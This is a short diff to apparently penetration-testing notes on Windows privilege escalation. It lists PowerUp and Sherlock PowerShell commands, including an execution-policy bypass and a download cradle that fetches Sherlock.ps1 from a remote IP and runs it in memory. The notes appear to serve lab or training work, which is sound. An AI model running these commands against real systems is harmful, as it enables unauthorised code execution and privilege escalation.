@@ -2,12 +2,15 @@ https://github.com/frizb/Windows-Privilege-Escalation
 https://recipeforroot.com/advanced-powerup-ps1-usage/
 
 ###powershell with Priv checker
-
 ```
 PS C:\> Import-Module PowerUp.ps1
 
 PS C:\> . .\PowerUp.ps1
+```
 ![image](https://user-images.githubusercontent.com/9059079/118397345-7f3fdd80-b621-11eb-805e-df3757f8e371.png)
+
+```
+
 
 PS C:\Users\merlin\Desktop> PS C:\Users\merlin\Desktop> powershell.exe -exec bypass -Command "& {Import-Module .\Sherlock.ps1; Find-AllVulns}"
 PS C:\users\merlin\appdata\local\temp> iex(new-object net.webclient).downloadstring('http://10.10.14.5/Sherlock.ps1')
